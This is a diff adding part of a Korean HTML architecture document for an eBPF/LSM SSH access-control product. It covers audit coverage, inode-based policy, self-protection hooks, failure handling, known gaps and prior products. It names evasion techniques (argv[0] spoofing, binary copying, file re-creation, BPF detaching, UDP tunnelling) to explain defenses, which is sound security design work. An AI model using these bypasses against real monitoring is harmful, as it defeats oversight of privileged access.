+    <p class="lede">“누가”는 거의 완벽하다. “무엇을 실행했는지”도 프로세스 단위로는 빠짐없이 남는다. 그런데 <strong>“무슨 명령을 쳤는지”와는 다른 이야기</strong>다. 이 구분을 제품 설명에서 흐리면 감사 현장에서 반증당한다.</p>
+
+    <h3>실행은 빠짐없이 남고, 타이핑은 남지 않는다</h3>
+
+<pre>$ cd /etc                    <i>─ 안 남음   셸 빌트인이라 exec이 없다</i>
+$ ls -la                     <b>─ 남음</b>      <i>execve(/bin/ls) + 사람 이름</i>
+$ cat shadow                 <i>─ 부분      exec은 남지만 읽은 대상·내용은 기본 미기록</i>
+$ echo "x" &gt;&gt; hosts          <i>─ 부분      echo는 빌트인이라 안 남지만</i>
+                             <i>            /etc/hosts 쓰기 open은 남고 차단된다</i>
+$ python3                    <b>─ 남음</b>
+  &gt;&gt;&gt; os.system("curl ...")  <b>─ 남음</b>      <i>내부에서 fork/exec 하므로</i>
+  &gt;&gt;&gt; open("/tmp/x","w")     <b>─ 남음</b>      <i>쓰기 open</i>
+$ vi config                  <i>─ 부분      exec과 저장 write는 남지만</i>
+                             <i>            무엇을 어떻게 고쳤는지는 안 남는다</i></pre>
+
+    <p>커널 훅은 <strong>프로세스가 만들어지는 순간</strong>과 <strong>자원에 손대는 순간</strong>을 본다. 셸 빌트인과 인터프리터 내부 로직은 그 사이에서 일어나므로 보이지 않는다. 다만 그 로직이 <em>실제로 무언가를 하려는 순간</em>에는 반드시 syscall이 발생하므로, <strong>행위는 놓치지 않고 의도만 놓친다.</strong></p>
+
+    <h3>argv는 증거가 아니다</h3>
+    <p><code>bprm_check_security</code>에서 명령줄 인자를 읽을 수는 있지만 두 가지 이유로 1급 증거가 못 된다. BPF 스택 제약으로 <strong>길이가 잘리고</strong>, 무엇보다 <strong>argv는 호출자가 통제한다</strong> — <code>exec -a</code> 한 줄이면 <code>argv[0]</code>이 통째로 위조된다. 신뢰의 근거는 커널이 실제로 연 <strong>바이너리의 inode</strong>다. 감사 리포트는 inode 기준 실제 실행 파일을 앞세우고 argv는 참고 정보로 뒤에 붙여야 한다.</p>
+
+    <h3>남지 않는 것</h3>
+    <div class="table-scroll">
+      <table>
+        <thead><tr><th>남지 않는 것</th><th>이유</th><th>의도 여부</th></tr></thead>
+        <tbody>
+          <tr><td class="name">파일 읽기</td><td class="dim"><code>file_open</code> 오버헤드를 감당할 수 없어 쓰기만 판정한다 (§15)</td><td class="dim">설계상 결정. 소수 inode는 별도 감시 목록으로 보완</td></tr>
+          <tr><td class="name">터미널 입력 자체</td><td class="dim">세션 녹화 제품이 아니다</td><td class="dim">의도적. 비밀번호가 감사 로그에 남는 사고를 원천 차단한다</td></tr>
+          <tr><td class="name">허용된 쓰기의 개별 기록</td><td class="dim">볼륨이 커서 ringbuf가 넘친다</td><td class="dim">집계로 대체. 차단은 언제나 전건 기록</td></tr>
+          <tr><td class="name">위임 프로세스의 “누가”</td><td class="dim">태그가 끊겨 주체를 붙일 수 없다 (§04)</td><td class="dim">위임 <em>요청</em> 자체는 남는다</td></tr>
+          <tr><td class="name">warrantd 장기 부재 중의 이벤트</td><td class="dim">ringbuf 용량을 넘기면 유실된다</td><td class="dim">유실 구간을 명시적으로 기록해 “빈 구간”을 숨기지 않는다</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>보완: 셸 명령줄까지 잡고 싶다면</h3>
+    <p>bash의 <code>readline</code> 반환 지점에 <code>uprobe</code>를 걸면 대화형으로 입력한 명령줄 자체를 잡을 수 있다. bcc의 <code>bashreadline</code>이 하는 일이고, 여기에 영장 태그를 묶으면 “누가 무슨 명령을 쳤는지”까지 완성된다. 빌트인도 잡힌다.</p>
+    <p>다만 <strong>bash 한정이고, 셸을 바꾸거나 비대화형으로 실행하면 통째로 빠진다.</strong> 그래서 이건 <strong>보조 증거</strong>로만 쓰고, 1급 증거는 여전히 exec 기록이어야 한다. 우회 가능한 것을 1급 증거로 두면 감사 체계 전체의 신뢰도가 그 수준으로 떨어진다.</p>
+
+    <div class="callout warn">
+      <span class="ct">판매 문구 주의</span>
+      <p>“모든 명령을 기록합니다”는 <strong>쓰면 안 되는 문장</strong>이다. 고객이 <code>cd</code> 한 번만 쳐 봐도 반증된다. 정확한 문구는 <strong>“실행된 모든 프로세스를 사람에게 귀속시켜 기록합니다”</strong>다. 전자는 반증되고 후자는 반증되지 않으며, 감사 요건이 실제로 요구하는 것도 후자다.</p>
+    </div>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="num">15</span><h2 class="h">설계 결정 세 가지</h2></div>
+
+    <h3>읽기는 통제하지 않는다</h3>
+    <p><code>file_open</code>은 시스템에서 가장 뜨거운 훅 중 하나다. 읽기까지 판정하면 오버헤드가 감당이 안 되고, 경로 문자열 매칭은 BPF에서 값비싸다. 그래서 <strong>쓰기·삭제·이름변경만 통제하고 읽기는 전면 허용한다.</strong> 읽기 통제를 포기한 대가는 아웃바운드 전면 차단으로 메운다 — 읽을 수는 있어도 밖으로 내보낼 수 없다. 특정 파일의 열람 사실 자체가 중요하면, 그 소수의 inode만 별도 감시 목록에 올린다.</p>
+
+    <h3>경로가 아니라 inode로 식별한다</h3>
+    <p>정책에는 <code>/usr/bin/git</code>이라고 쓰지만 맵에는 inode 번호가 들어간다. BPF에서 경로 문자열을 다루지 않아도 되고, 부수적으로 <strong>바이너리 복사 우회가 자동으로 막힌다</strong> — <code>/bin/bash</code>를 <code>/tmp/git</code>으로 복사해도 새 inode라 허용 목록에 없다. 대가는 패키지 업데이트로 inode가 바뀌면 재컴파일이 필요하다는 것이고, warrantd가 <code>fanotify</code>로 감시해 자동 갱신한다.</p>
+
+    <p><strong>다만 허용과 금지는 비대칭이다.</strong> 허용 목록은 파일 inode로 충분하지만, <strong>금지 목록을 파일 inode로 걸면 뚫린다</strong> — <code>/etc/passwd</code>의 inode를 막아도 <code>mv</code> 후 재생성하면 새 inode라 목록 밖이다. 금지는 <strong>디렉터리 inode</strong>로 걸어야 한다. <code>/etc</code> 디렉터리를 잡으면 그 안에서의 생성·삭제·이름변경이 전부 <code>/etc</code>에 대한 조작이라 함께 막히기 때문이다. 그래서 금지 대상에는 <code>lsm/inode_create</code>·<code>inode_unlink</code>·<code>inode_rename</code>·<code>inode_link</code>·<code>inode_symlink</code>를 같이 걸어야 완전해진다.</p>
+
+    <p>그리고 inode는 언제나 <strong>device 번호와 쌍으로</strong> 다룬다. bind mount로 같은 파일을 다른 경로에 노출시키는 우회가 경로 문자열 비교로는 뚫리지만, <code>(dev, ino)</code> 쌍으로는 뚫리지 않는다.</p>
+
+    <div class="callout">
+      <span class="ct">여기서 나오는 성질</span>
+      <p>커널의 권한 검사는 <strong>DAC 통과 → LSM 훅 호출</strong> 순서이고, <strong>LSM은 거부만 할 수 있을 뿐 허용을 만들어내지 못한다.</strong> uid 0이 <code>CAP_DAC_OVERRIDE</code>로 파일 권한을 통째로 무시하더라도 그다음 관문인 영장에서 <code>-EPERM</code>이 난다. <code>chmod</code>·<code>chown</code>으로 풀려는 시도 역시 syscall이라 또 훅을 지난다. <strong>OS 권한과 무관하게 특정 경로의 쓰기를 막을 수 있다</strong>는 뜻이고, 이게 이 제품이 <code>sudoers</code>나 셸 래퍼와 근본적으로 다른 지점이다.</p>
+    </div>
+
+    <h3>감사 모드와 강제 모드가 같은 코드를 쓴다</h3>
+    <p>판정 함수는 하나다. attach 지점만 바뀐다.</p>
+<pre><i>// 강제 — BPF LSM 필요, 재부팅 필요</i>
+SEC("<b>lsm/file_open</b>")           int check(struct file *f) { return verdict(f); }
+
+<i>// 감사 — 같은 인자, 반환값은 무시됨. 재부팅 불필요</i>
+SEC("<b>kprobe/security_file_open</b>") int probe(struct file *f) { verdict(f); return 0; }</pre>
+    <p>커널이 LSM 훅으로 호출하는 <code>security_*</code> 함수에 kprobe를 걸면 <strong>같은 인자를 같은 시점에</strong> 받는다. 덕분에 감사 모드에서 쌓은 데이터가 강제 모드의 판정과 정확히 일치한다. “감사에서는 안 걸렸는데 강제로 켜니 막히더라”가 구조적으로 생기지 않는다.</p>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="num">16</span><h2 class="h">자기 보호 — root가 훅을 떼지 못하게</h2></div>
+
+    <p class="lede">“root보다 강한 경계”라는 주장은 <strong>root가 그 경계를 만드는 장치를 끌 수 없어야만</strong> 성립한다. 영장 세션의 root가 <code>bpftool prog detach</code> 한 줄로 무력화할 수 있으면 앞의 모든 설계가 장식이다. 다행히 자기 보호도 같은 도구로 한다.</p>
+
+    <div class="table-scroll">
+      <table>
+        <thead><tr><th>무력화 시도</th><th>막는 훅</th><th>정책</th></tr></thead>
+        <tbody>
+          <tr><td class="name">BPF 프로그램 detach · 맵 조작</td><td class="mono">lsm/bpf · bpf_prog · bpf_map</td><td class="dim">영장 세션에서 <code>bpf()</code> syscall 전면 금지</td></tr>
+          <tr><td class="name">warrantd 강제 종료</td><td class="mono">lsm/task_kill</td><td class="dim">영장 세션이 warrantd·sshd에 신호를 보내지 못하게</td></tr>
+          <tr><td class="name">bpffs 언마운트</td><td class="mono">lsm/sb_umount</td><td class="dim"><code>/sys/fs/bpf</code> 언마운트 차단 (pin이 풀리면 훅이 사라진다)</td></tr>
+          <tr><td class="name">ptrace로 warrantd 조작</td><td class="mono">lsm/ptrace_access_check</td><td class="dim">태그된 프로세스가 태그 없는 프로세스를 붙잡지 못하게</td></tr>
+          <tr><td class="name">커널 모듈 적재</td><td class="mono">lsm/kernel_module_request</td><td class="dim">기본 금지. 필요하면 별도 영장으로 명시 허용</td></tr>
+          <tr><td class="name">warrantd 바이너리·유닛 파일 변조</td><td class="mono">lsm/file_open · inode_unlink</td><td class="dim">자기 파일과 <code>/etc/systemd/system</code>을 쓰기 금지 목록에 자동 등록</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <p>여섯 개가 다 필요하다. 하나라도 열려 있으면 나머지가 무의미해진다. 그래서 이 목록은 정책이 아니라 <strong>제품이 강제로 삽입하는 기본 규칙</strong>으로 두고, 영장 작성자가 실수로 열 수 없게 한다.</p>
+
+    <div class="callout warn">
+      <span class="ct">전제와 예외</span>
+      <p>이 모든 것은 <strong>커널이 온전하다는 전제</strong> 위에 있다. 커널 익스플로잇이나 부팅 경로 장악 앞에서는 무의미하다 (§06). 그리고 break-glass 영장은 정의상 이 제한들을 풀 수 있어야 하므로, 그 영장의 발급과 사용은 최고 등급 경보 대상이다. 평상시 운영자가 BPF 도구나 커널 모듈을 다뤄야 한다면 그것도 별도 영장으로 명시 허용한다 — <strong>기본은 언제나 금지다.</strong></p>
+    </div>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="num">17</span><h2 class="h">고장났을 때</h2></div>
+
+    <p class="lede">접근통제 시스템의 제1원칙은 하나다. <strong>자기를 고치러 오는 사람을 잠그면 안 된다.</strong></p>
+
+    <div class="table-scroll">
+      <table>
+        <thead><tr><th>상황</th><th>동작</th></tr></thead>
+        <tbody>
+          <tr><td class="name">중앙과 단절</td><td class="dim">캐시된 영장으로 계속 집행. 신규 발급만 불가. 캐시 최대 수명을 넘기면 신규 세션은 무영장으로 기록되며 통과</td></tr>
+          <tr><td class="name">warrantd 사망</td><td class="dim">BPF는 pin되어 있으므로 <strong>강제가 계속된다.</strong> 만료·취소도 맵에 이미 있는 값대로 작동. 감사 이벤트만 유실되므로 ringbuf 크기로 버틴다</td></tr>
+          <tr><td class="name">PAM이 warrantd에 못 붙음</td><td class="dim"><strong>로그인을 허용한다.</strong> 무영장 세션으로 기록하고 경보. 여기서 fail-close를 택하면 장애 때 아무도 못 들어간다</td></tr>
+          <tr><td class="name">BPF 프로그램 오작동</td><td class="dim">킬스위치 맵 플래그 하나로 모든 훅이 즉시 통과. 프로그램 detach나 재배포를 기다리지 않는다</td></tr>
+          <tr><td class="name">긴급 상황</td><td class="dim">오프라인 검증이 가능한 로컬 서명 break-glass 영장. 사용 즉시 최고 등급 경보가 나가고 전 구간이 기록된다</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout warn">
+      <span class="ct">한 줄 요약</span>
+      <p>강제 경로는 커널에 있어서 <strong>단단하게</strong> 실패하고, 발급 경로는 유저 공간에 있어서 <strong>느슨하게</strong> 실패한다. 이 비대칭이 의도된 설계다.</p>
+    </div>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="num">18</span><h2 class="h">아직 못 메운 곳</h2></div>
+
+    <div class="table-scroll">
+      <table>
+        <thead><tr><th>구멍</th><th>왜 생기나</th><th>현재 답</th></tr></thead>
+        <tbody>
+          <tr>
+            <td class="name">만료 전에 열어둔 쓰기 fd</td>
+            <td class="dim"><code>file_open</code>은 여는 순간만 본다. 이미 열린 fd로의 write는 훅을 거치지 않는다</td>
+            <td class="dim"><code>file_permission</code>은 read/write마다 불려서 너무 비싸다. <code>on_expiry=강제종료</code> 옵션으로 대응하거나 감사로만 남긴다</td>
+          </tr>
+          <tr>
+            <td class="name">connect 없는 UDP 전송</td>
+            <td class="dim"><code>sendto</code>는 <code>socket_connect</code>를 거치지 않는다. DNS 터널링 경로</td>
+            <td class="dim"><code>lsm/socket_sendmsg</code> 추가. 비용이 오르므로 영장에 플래그가 있을 때만 attach</td>
+          </tr>
+          <tr>
+            <td class="name">다른 데몬에 위임</td>
+            <td class="dim">PID 1·atd·containerd-shim이 대신 fork하면 cgroup과 fork 체인이 동시에 끊긴다. <code>--scope</code>처럼 자기가 fork하는 형태는 2차 방어선에 걸린다 (§04)</td>
+            <td class="dim">실행 화이트리스트 + 소켓 차단 + spool 쓰기 차단의 3중 방어로 현실적으로는 봉쇄된다. 완전한 승계는 D-Bus 시그널 구독으로 Phase 2</td>
+          </tr>
+          <tr>
+            <td class="name">kubectl exec</td>
+            <td class="dim">컨테이너 cgroup에서 태어나므로 세션 scope가 없다</td>
+            <td class="dim">API 서버 감사 웹훅으로 “누가 어느 파드에”를 받아 다음 <code>runc exec</code>에 바인딩. Phase 2</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <p>넷 다 알고 있는 구멍이고, 감사 모드에서는 전부 <strong>기록은 된다</strong>. 막지 못할 뿐 보이지 않는 건 아니다 — 이 구분이 제품 설명에서 중요하다.</p>
+  </section>
+
+  <section>
+    <div class="sec-head"><span class="num">19</span><h2 class="h">부록: 같은 것을 시도한 사람들</h2></div>
+
+    <p class="lede">eBPF 기반 SSH 접근제어의 선행 사례 조사 (2026-08 기준). 결론: <strong>이 조합을 하는 살아있는 제품은 없다. 두 번의 상업적 시도가 있었고 둘 다 후퇴했다</strong> — 그리고 후퇴의 이유가 기술이 아니었다는 점이 이 기획의 근거가 된다.</p>
+
+    <div class="table-scroll">
+      <table>
+        <thead><tr><th>사례</th><th>했던 것</th><th>강제</th><th>결말</th></tr></thead>
+        <tbody>
+          <tr>
+            <td class="name"><a href="https://github.com/Gui774ume/ssh-probe">ssh-probe</a> <span style="font-family:var(--mono);font-size:11px;color:var(--ink-3)">OSS</span></td>
+            <td class="dim">사용자별 프로파일로 SSH 세션의 syscall을 카테고리별 허용/차단/MFA/세션종료. 시간제한 임시 권한(최대 10분)까지 — 이 문서와 가장 가깝다 (<a href="https://www.sstic.org/media/SSTIC2021/SSTIC-actes/monitoring_and_protecting_ssh_sessions_with_ebpf/SSTIC2021-Article-monitoring_and_protecting_ssh_sessions_with_ebpf-fournier.pdf">SSTIC 2021 논문</a>)</td>
+            <td class="dim">✓</td>
+            <td class="dim">Datadog 연구자의 프로토타입. 2021년 이후 사실상 방치 — 제품화된 적 없음</td>
+          </tr>
+          <tr>
+            <td class="name">Teleport Restricted Session <span style="font-family:var(--mono);font-size:11px;color:var(--ink-3)">상용</span></td>
+            <td class="dim">BPF-LSM(KRSI)으로 SSH 세션 단위 네트워크 차단 (<a href="https://goteleport.com/blog/preventing-data-exfiltration-with-ebpf/">소개 글</a>)</td>
+            <td class="dim">✓ 네트워크만</td>
+            <td class="dim">v14 deprecated → <a href="https://goteleport.com/blog/teleport-15/">v15에서 제거</a>. “iptables를 쓰라”로 후퇴</td>
+          </tr>
+          <tr>
+            <td class="name">Cmd <span style="font-family:var(--mono);font-size:11px;color:var(--ink-3)">상용</span></td>
+            <td class="dim">eBPF로 세션 감시 + 명령 가드레일(차단·MFA)</td>
+            <td class="dim">✓</td>
+            <td class="dim"><a href="https://www.elastic.co/about/press/elastic-and-cmd-join-forces-to-help-customers-take-command-of-their-cloud-workloads">2021 Elastic 인수</a> → 가시성(Session View)으로 흡수, 통제 제품은 소멸</td>
+          </tr>
+          <tr>
+            <td class="name"><a href="https://goteleport.com/docs/enroll-resources/server-access/guides/bpf-session-recording/">Teleport 세션 기록</a> · <a href="https://github.com/sshlog/agent">SSHLog</a></td>
+            <td class="dim">eBPF로 SSH 세션을 구조화 이벤트로 기록·알림</td>
+            <td class="dim">✗ 기록만</td>
+            <td class="dim">활성 — 이 문서의 “감사 모드”에 해당하는 선행 사례</td>
+          </tr>
+          <tr>
+            <td class="name"><a href="https://tetragon.io/">Tetragon</a> · <a href="https://github.com/kubearmor/KubeArmor">KubeArmor</a></td>
+            <td class="dim">범용 커널 정책 강제 (in-kernel 차단, SIGKILL)</td>
+            <td class="dim">✓</td>
+            <td class="dim">활성 — 빌딩블록은 전부 있으나 “세션·사람·시간” 개념이 없다. 정책의 주어가 프로세스·경로다</td>
+          </tr>
+          <tr>
+            <td class="name">JIT PAM (StrongDM·CyberArk 등) · 국내 접근제어</td>
+            <td class="dim">게이트웨이에서 시간제한 접근 발급</td>
+            <td class="dim">✗ 호스트에선</td>
+            <td class="dim">활성 — §01의 구조적 한계 그대로. eBPF 강제 없음</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <h3>후퇴의 이유가 곧 기회다</h3>
+    <ul>
+      <li><b>기술이 안 돼서 죽은 사례가 없다.</b> ssh-probe는 2021년에 타당성을 증명했다 — 차단·MFA·시간제한까지. 연구로 끝났을 뿐이다.</li>
+      <li><b>Teleport의 후퇴는 타이밍이었다.</b> 2021~22년의 BPF LSM은 배포 커널(RHEL 8, 구 Ubuntu)에서 미성숙했고, 게이트웨이 회사에게 호스트 강제는 주변부 기능이었다. 지금은 RHEL 9·Ubuntu 22.04+가 표준이라 커널 전제가 다르다.</li>
+      <li><b>Cmd의 소멸은 인수자의 사업 구조였다.</b> SIEM/XDR 회사가 접근통제 제품을 팔 이유가 없어 탐지 기능으로 흡수됐다.</li>
+      <li><b>이 문서의 포지셔닝이 두 실패 요인을 정확히 피한다.</b> 게이트웨이와 경쟁하지 않고(보완), 감사 모드가 단독으로 팔리므로(§07) 강제 기능이 주변부로 밀릴 사업 구조도 아니다.</li>
+    </ul>
+  </section>
+
+  <footer>
+    Session Warrant · 개념 · 기획 · 아키텍처 통합본 · 2026-08-15<br>
+    다음 결정 필요: 감사 모드 PoC 착수 / 사내 인프라에서 영장 없는 접속 실측 / file_open 훅 오버헤드 벤치 / 승인 워크플로 연동 대상 선정
+  </footer>
+</div>
+</body>
+</html>
